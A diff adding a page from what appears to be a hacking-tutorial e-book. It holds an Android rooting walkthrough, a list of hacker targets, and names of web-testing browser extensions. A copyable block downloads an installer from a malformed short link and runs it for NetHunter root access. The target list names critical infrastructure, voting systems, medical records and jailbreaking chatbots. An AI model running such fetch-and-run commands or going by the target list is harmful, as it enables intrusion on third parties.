+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                     </div>
+
+
+                     <!--------------Rooting an Android Phone------------------->
+                     <h1>Rooting Android phone</h1>
+                     <p>Requirements/Tools
+                        <br>1.Island apk from playstore
+                        <br>2.Magisk
+                        <br>3.Termux
+                        <br>4.Kali Linux
+                        <br>5.Cometin
+                        <br>6. OEM enabled on Android developer options.
+                        <br>7.Fdroid
+                        <br>8.VNC
+                     </p>
+
+                     <h3>Enabling OEM before rooting</h3>
+                     <div class="code-block">
+                        <pre><code class="language-bash">
+                           $adb reboot recovery
+                           $adb devices
+                           $adb sideload update.zip
+                           $termux-setup-storage
+                           $wget -O install-nethunter-termux https://offsec/zMcrZWr
+                           $chmod +x install-nethunter-termux
+                           $./install-nethunter-termux
+                           $nethunter -r -&gt; root access
+                           $kex passwd -&gt; set VNC password
+                          $kex &amp; -&gt; launch VNC server</code></pre>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                     </div>
+
+
+                  </div>
+
+                  <hr />
+
+                  <!---------------- Potential Targets for Hackers --------------------->
+                  <div></div>
+                  <h1 id="potential-targets-for-hackers">Common targets for hackers.</h1>
+                  <ol type="1">
+                     <li>Financial institutions</li>
+                  </ol>
+                  <ul>
+                     <li>Banking systems</li>
+                     <li>Cryptocurrency</li>
+                     <li>Saccos</li>
+                     <li>Mobile banking</li>
+                     <li>ATM machines</li>
+                     <li>Supply chain vendors</li>
+                  </ul>
+                  <p><br></p>
+                  <ol start="2" type="1">
+                     <li>Infrastructure</li>
+                  </ol>
+                  <ul>
+                     <li>electric grids</li>
+                     <li>natural gas lines</li>
+                     <li>Electric vehicles</li>
+                  </ul>
+                  <p><br></p>
+                  <ol start="3" type="1">
+                     <li>Systems</li>
+                  </ol>
+                  <ul>
+                     <li>E-commerce </li>
+                     <li>Betting - money</li>
+                     <li>School - fee records, report cards</li>
+                     <li>Healthcare - patients records </li>
+                     <li>Voting systems</li>
+                     <li>Tax authority ie KRA</li>
+                  </ul>
+                  <p><br></p>
+                  <ol start="4" type="1">
+                     <li>Social media Accounts</li>
+                  </ol>
+                  <ul>
+                     <li>Meta(FB, IG, WhatsApp)</li>
+                     <li>X(formaly Twitter)</li>
+                     <li>LinkedIn</li>
+                     <li>Telegram,Signal, </li>
+                  </ul>
+                  <p><br></p>
+                  <ol start="5" type="1">
+                     <li>AI models</li>
+                  </ol>
+                  <ul>
+                     <li>Jailbreak chatbots</li>
+                     <li>IoT devices</li>
+                  </ul>
+                  <p><br></p>
+                  <ol start="6" type="1">
+                     <li>Computer Networks </li>
+                  </ol>
+                  <ul>
+                     <li>Wi-fi, Server, router</li>
+                     <li>Surveillance - CCTV, Webcams</li>
+                     <li>Satellites communication</li>
+                  </ul>
+                  <p><br></p>
+                  <ol start="7" type="1">
+                     <li>Video games</li>
+                  </ol>
+                  <ul>
+                     <li>make game easier</li>
+                     <li>Coins, wins, strength </li>
+                  </ul>
+                  <p><br></p>
+                  <ol start="8" type="1">
+                     <li>Bussiness </li>
+                  </ol>
+                  <ul>
+                     <li>Valuable data - credit cards, ID</li>
+                     <li>Espionage - spying competitors</li>
+                  </ul>
+                  <p><br></p>
+                  <ol start="9" type="1">
+                     <li>Telecommunication</li>
+                  </ol>
+                  <ul>
+                     <li>Calls &amp; SMS </li>
+                     <li>TV &amp; Radio channels </li>
+                  </ul>
+                  <hr />
+
+                  <!------------------------------Useful Chrome Extensions --------------------------->
+
+                  <div>
+                     <h1 id="some-useful-browser-extensions">Some useful browser
+                        extensions</h1>
+                     <ul>
+                        <li>Cookie editor</li>
+                        <li>Firebug lite for google chrome</li>
+                        <li>D3coder</li>
+                        <li>EndPointer</li>
+                        <li>Built with </li>
+                        <li>Form fuzzer</li>
+                        <li>Session manager</li>
+                        <li>Request maker</li>
+                        <li>Shodan</li>
+                        <li>XSS rays</li>
+                        <li>WebSecurify</li>
+                        <li>Port scanner</li>
+                        <li>XSS chef</li>
+                        <li>HPP finder</li>
+                        <li>The exploit database</li>
+                        <li>GHDB</li>
+                        <li>IP address and domain information</li>
+                        <li>Retire js</li>
+                        <li>Temper monkey </li>
+                        <li>Foxy proxy</li>
+                        <li>Site spider</li>
+                     </ul>
+                  </div>
+
+                  <!----------------Bottom Navigation ------------------>
+
+                  <p>Use the navigation buttons below to move between pages.</p>
+                  <div class="book-navigation">
+                     <button class="top-page" onclick="window.scrollTo({ top: 0, behavior: 'smooth' });">
+                        <img src="assets/icons/back-to-top.svg" alt="Top" class="icon">Top
+                     </button>
+                     <button class="next-page" data-next-page="1Reconnaissance.html">
+                        Next Page <img src="assets/icons/nextpage.ico" alt="Next" class="icon">
+                     </button>
+                  </div>
+               </div>
+            </div>
+         </div>
+      </div>
+
+
+      <script>
+         //Hide menu on clicking outside the left-column
+         const leftColumn = document.getElementById('left-column');
+         const rightColumn = document.getElementById('right-column');
+
+         function toggleMenu() {
+            leftColumn.classList.toggle('active');
+         }
+
+         rightColumn.addEventListener('click', () => {
+            // Only hide if screen is mobile size and menu is open
+            if (window.innerWidth <= 768 && leftColumn.classList.contains('active')) {
+               leftColumn.classList.remove('active');
+            }
+         });
+      </script>
+
+      <script>
+         const bookPage = document.getElementById("book-page");
+         const bookContent = document.getElementById("book-content");
+
+         function loadPage(targetPage, direction) {
+            const flipClass = direction === 'next' ? 'flip-forward' : 'flip-backward';
+
+            bookPage.classList.add(flipClass);
+
+            setTimeout(() => {
+               fetch(targetPage)
+                  .then(response => response.text())
+                  .then(data => {
+                     const parser = new DOMParser();
+                     const doc = parser.parseFromString(data, 'text/html');
+                     const newContent = doc.getElementById("book-content").innerHTML;
+
+                     bookContent.innerHTML = newContent;
+                     bookPage.classList.remove(flipClass);
+                  });
+            }, 600); // wait for animation
+         }
+
+         document.querySelector(".next-page").addEventListener("click", function () {
+            loadPage(this.dataset.nextPage, 'next');
+         });
+
+         document.querySelector(".prev-page").addEventListener("click", function () {
+            loadPage(this.dataset.prevPage, 'prev');
+         });
+      </script>
+
+      <script>
+         function copyCode(btn) {
+            const code = btn.parentElement.querySelector('code').innerText;
+            navigator.clipboard.writeText(code).then(() => {
+               btn.innerText = "Copied!";
+               setTimeout(() => btn.innerText = "Copy", 1500);
+            });
+         }
+      </script>
+
+
+
+
+      <script src="assets/js/main.js"></script>
+</body>
+
+</html>
